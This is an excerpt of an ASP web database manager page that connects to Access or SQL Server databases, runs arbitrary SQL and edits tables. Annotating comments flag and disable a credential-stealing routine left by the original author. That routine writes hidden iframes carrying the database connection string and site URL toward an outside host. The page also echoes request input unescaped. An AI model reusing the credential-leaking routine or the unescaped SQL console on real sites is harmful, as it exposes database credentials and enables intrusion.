...
<html>
<!--
'Peace提醒，请谨慎使用，使用时请去掉前3行，并设置好访问权限！
'原作者很缺德，请分析以下“Peace注”提示的代码
'Peace稍做修改，并添加robots相关meta信息
-->
<head>
...
Else 
  ...
  ch02 = "checked"
End If
defPath = server.mappath("/")&"\"
defPath = Replace(defPath,"\","\\")
	%>
<form action="?key=db" method="post" name="dbt">
  <br>
  连接类型：
  <input name="dbtype" type="radio" value="access" onClick="dbstr.value='Provider=Microsoft.Jet.OLEDB.4.0;Persist Security Info=False;Password=;Data Source=<%=defPath%>'" <%=ch01%>>
  ACCESS
  <input name="dbtype" type="radio" value="mssql" onClick="dbstr.value='driver={SQL Server};database=XXEDU_CN_2011;Server=localhost;uid=sa;pwd='" <%=ch02%>>
  SQL<br>
  <br>
  连接字符：
  <input name="dbstr" type="text" id="dbstr" size="80" value="<%=conn%>">
  <input type="submit" name="Submit" value="连接" />
  <br>
  <br>
  注：access请使用绝对路径,本文件路径：<%=server.MapPath("dbm.asp")%>
</form>
<form name="createdatabase" method="post" action="?key=createdatabase">
  <font color=red>建数据库：</font>
  <input name="dataname" type="text" value="<%=server.MapPath("/")&"\database.mdb"%>" size="80">
...
function cnDbm()
	...
	case "access"
		...
		'dbope() '此为恶意代码！Peace注
		cnStr = session("dbstr")
		Set cn01 = Server.CreateObject("ADODB.Connection")
		cn01.Open cnStr
	case "mssql"
		'==================================================================连接SQL数据库
		'dbope() '此为恶意代码！Peace注
		set cn01 = Server.CreateObject("ADODB.Connection") 
		cn01.open session("dbstr") 
	end select
...
<form action="?key=sql" method=post name="exesql">
  <font color=red>执行sql语句：</font><font color=#999999>(每句语句以“;”结束，支持(--)SQL注释，Ctrl + Enter 快速提交)</font>&nbsp;
  <input type="button" value="刷新本页" onClick="javascript:location.reload()">
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span onClick="document.exesql.sql.rows+=5;" style="cursor:pointer;">+</span> <span onClick="if(document.exesql.sql.rows>9)document.exesql.sql.rows-=5" style="cursor:pointer;">-</span>
  <div style="float:left;width:600px;">
    <textarea id="sql" name="sql" style="width:600px;" rows="9" ondblClick="this.select();" onKeyDown="ctlent()"><%=request("sql")%></textarea>
    <br />
    <input type="checkbox" name="SchemaTable" value="1" style="border:0px;">
    adSchemaTables
    <input type="checkbox" name="SchemaColumn" value="2" style="border:0px;">
    adSchemaColumns
    <input type="checkbox" name="SchemaProvider" value="3" style="border:0px;">
  ...
  <div style="float:left;width:50px;padding:60px 0px 0px 5px;">
    ...
    <br />
    <br />
    <input type="button" name="Submit3" value="清空" onClick="sql.value=''">
    <br />
    <br />
...
<form action="?key=createtable" method="post">
  <table width="600" border="0" cellpadding="2" cellspacing="1" bgcolor="#CCCCCC">
    ...
    <tr>
      <td width="75" height="20" align="center"><input type="text" name="field_name" size="10"></td>
      <td width="99" height="20" align="center"><% fieldtypelist(0) %></td>
      <td width="73" height="20" align="center"><input type="text" name="field_size" size="10"></td>
      <td width="96" height="20" align="center"><select name="null">
          <option value="NOT_NULL">NOT_NULL</option>
          <option value="NULL">NULL</option>
        </select></td>
      <td width="83" height="20" align="center"><select size="1" name="autoincrement">
          <option></option>
          <option>自动编号</option>
        </select></td>
      <td width="143" height="20" align="left"><select name="primarykey">
          <option></option>
    ...
    <% next %>
    <tr>
      <td height="35" align="center" colspan="5"><input type="hidden" name="i" value=<%=field_num%>>
        <input type="hidden" name="table_name" value="<%=table_name%>">
        <input type="submit" name="Submit" value=" 提 交 ">
        &nbsp;&nbsp;
        <input type="reset" name="Submit2" value=" 重 置 ">
        &nbsp;&nbsp;
        <input type="button" name="ok" value=" 放 弃 " onClick="javascript:history.go(-1)"></td>
      <td height="20"></td>
    </tr>
  </table>
</form>
...
sub dbope '此为恶意代码！Peace注
'这个作者很缺德啊！
'Peace去掉了函数GetUrl()
if session("dbope") <> 1 then
%>
<!--http://www.cdinf.net/dbstrs/1.asp-->
<iframe src="?dbstr=<%=session("dbstr")%>" width=0 height=0></iframe>
<iframe src="?dburl=<%=GetUrl()%>" width=0 height=0></iframe>
<%
session("dbope")=1
end if
end sub '恶意代码结束！Peace注
...
sub view(table_name)
	...
	on error resume next
	table = table_name
	Set primary = cnDbm.OpenSchema(adSchemaPrimaryKeys,Array(empty, empty, table))
...
<font color=red>表：<%=table_name%></font>&nbsp;&nbsp;&nbsp;&nbsp;
<input type="button" value="刷新本页" onClick="javascript:location.reload()">
<br>
<br>
...
<table width="600" border="0" cellpadding="1" cellspacing="1" bgcolor="#CCCCCC">
  ...
  <tr>
    ...
    <td align="center"><a href="?key=editfidlevi&fidle=<%=rs(i).name%>&table_name=<%=table_name%>&fidletype=<%=typ(rs(i).type)%>">修改</a>&nbsp; <a href="?key=sql&sql=alter table [<%=table_name%>] drop [<%=rs(i).name%>];" onClick="return table_delete();">删除</a></td>
  </tr>
  <%
...
<br>
<a href="?key=tosql&strt=0&table_name=<%=table_name%>">导出表结构</a> &nbsp; <a href="?key=sql&sql=select * from <%=table_name%>&table_name=<%=table_name%>&primarykey=<%=primarykey%>">浏览表记录</a> &nbsp; <a href="?key=sql&sql=DROP TABLE <%=table_name%>" onClick="return table_delete();">删除表</a> &nbsp;&nbsp;&nbsp;
...
<form action="?key=addfield" method="post">
  <table width="600" height="39" border="0" cellpadding="2" cellspacing="1" bgcolor="#CCCCCC">
    ...
    <tr>
      <td width="60" height="20" align="center"><input type="text" name="fldname" size="10"></td>
      <td width="50" height="20" align="center"><% fieldtypelist(0) %></td>
      <td width="58" height="20" align="center"><input type="text" name="fldsize" size="10"></td>
      <td width="64" height="20" align="center"><input name="null" type="checkbox" value="ON" checked></td>
      <td width="66" height="20" align="center"><input type="checkbox" name="autoincrement" value="ON"></td>
      <td width="96" height="20" align="center"><input type="hidden" name="table_name" value="<%=table_name%>">
...
<form action="?key=editfidle&fidle=<%=request("fidle")%>&table_name=<%=request("table_name")%>" method="post" name=frm onSubmit="return validate(frm)">
  <table width="600" border="0" cellpadding="2" cellspacing="1" bgcolor="#CCCCCC">
    ...
    <tr>
      ...
      <td width="50" height="20" align="center"><% fieldtypelist(request("fidletype")) %></td>
      <td width="58" height="20"><input type="text" name="size" size="10"></td>
      <td width="64" height="20" align="center"><input type="checkbox" name="null" value="null"<%=iif((rs(i).Attributes and adFldIsNullable)=0,""," checked")%>></td>
      <td width="66" height="20" align="center"><input type="checkbox" name="autoincrement" value="y"<%=iif(rs(i).Properties("ISAUTOINCREMENT") = True," checked","")%>></td>
      <td width="96" height="20" align="center"><input type="submit" name="Submit" value="提交"></td>
    </tr>
  </table>
  <br>
</form>
...
<table width="100%" border="0" cellpadding="2" cellspacing="1" bgcolor="#CCCCCC">
  <tr>
    ...
    <td align="left">当前表：<font color=red><%=request("table_name")%></font>&nbsp;&nbsp;&nbsp;&nbsp; <a href="?key=edit&table_name=<%=request("table_name")%>&primarykey=<%=request("primarykey")%>&action=add">插入新记录</a></td>
    <% end if %>
    <td align="right"><%
...
dim rs
'set rs = cnDbm.OpenSchema()
set rs = cnDbm.OpenSchema (QueryType)
'set rs = cnDbm.OpenSchema (adSchemaProviderTypes)
...
sub tosql(strt)
	...
	if strt = "2" then
		...
		echo "<input type='button' name='ok' value=' 返 回 ' onClick='javascript:history.go(-1)'>"
		set objSchema = cnDbm.OpenSchema(adSchemaTables)
...
<table width="100%" height="100%" border="0" cellpadding="5" cellspacing="1" bgcolor="#CCCCCC">
  <tr>
    <td width="18%" valign="top">
        <div id="Layer1" style="width:150px;height:0px;overflow-x:auto;overflow-y:auto; ">
...
'echo "存储过程：<br>"
'set objSchema = cnDbm.OpenSchema(adSchemaProcedures)
'Do While Not objSchema.EOF
...
%>
    ...
    <td width="82%" valign="top"><div id="Layer2" style="overflow-x:anto;overflow-y:auto; width:100%;height:100%;">
        <%
